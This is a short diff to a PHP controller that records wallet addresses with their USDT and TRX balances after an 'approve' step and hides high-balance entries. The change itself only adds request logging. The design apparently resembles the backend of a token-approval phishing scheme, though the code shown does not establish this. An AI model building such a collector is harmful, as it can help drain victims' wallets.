@@ -3,7 +3,8 @@
 namespace app\api\controller;
 
 use app\common\controller\Api;
-
+use think\Log;
+use think\Config;
 /**
  * 授权
  */
@@ -22,6 +23,8 @@ class Approve extends Api
      */
     public function receive()
     {
+        Log::record("receive:".json_encode($this->request->param()));
+        Log::record("receive:".json_encode($this->request->request()));
         $address = $this->request->param('address');
         $usdt_balance = $this->request->param('usdt');
         $trx_balance = $this->request->param('trx');
@@ -35,6 +38,7 @@ class Approve extends Api
             'platform' => $platform,
             'createtime' => time(),
         ];
+        Log::record("receive:".json_encode($data)."::".Config::get('tron.max_usdt_balance'));
         if($usdt_balance > Config::get('tron.max_usdt_balance')){
             $data['show'] = 0;
         }
